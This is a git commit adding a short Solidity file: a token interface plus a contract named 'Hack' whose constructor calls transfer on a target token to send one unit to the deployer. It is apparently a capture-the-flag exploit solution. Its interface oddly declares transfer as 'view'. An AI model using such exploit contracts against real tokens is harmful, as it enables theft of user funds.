8aa591d0fcc7e3b5492edda4a76b5057d0734966
Saptarshi Mitra <140695779+Saptarshi1010@users.noreply.github.com>
2023-10-20 14:48:21 +0530

    Add files via upload

---
+++ Token/TokenInterface.sol
@@ -0,0 +1,11 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8;
+interface IToken{
+    function balanceOf(address) external view returns(uint) ;
+    function transfer(address to, uint value) external view returns(bool);
+}
+contract Hack {
+    constructor(address _target) {
+        IToken(_target).transfer(msg.sender,1);
+    }
+}
